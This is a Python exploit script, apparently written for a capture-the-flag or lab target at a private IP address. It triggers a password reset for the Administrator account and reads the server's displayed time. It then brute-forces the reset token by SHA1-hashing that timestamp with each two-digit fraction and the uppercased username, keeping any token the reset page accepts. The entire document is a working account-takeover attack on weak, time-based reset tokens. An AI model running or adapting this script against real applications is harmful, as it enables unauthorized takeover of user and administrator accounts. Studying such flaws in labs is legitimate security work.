import datetime
import hashlib
import requests
import re

username = 'administrator'

base_url = 'http://10.10.227.89:8080/'
data = {
    "username": "Administrator"
}
requests.post(base_url + "forgot_password", data=data)
response = requests.get(base_url)
if response.status_code == 200:
    time_pattern = r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'
    match = re.search(time_pattern, response.text)
    if match:
        current_time_str = match.group(1)
print(current_time_str)
valid_tokens = []

for ms in range(100):
    ms_str = str(ms).zfill(2)  
    token_data = current_time_str + "." + ms_str + " . " + username.upper()
    hashed_token = hashlib.sha1(token_data.encode("utf-8")).hexdigest()
    #print("Trying token:", hashed_token)
    #print(token_data + ":" + hashed_token)
    response = requests.get(base_url + 'password_reset', params={'token': hashed_token})
    #print(response.text)
    if '<h2>Invalid token</h2>' not in response.text:
        print(f'Valid token: {hashed_token}')
        valid_tokens.append(hashed_token)

print("Valid tokens:", valid_tokens)#
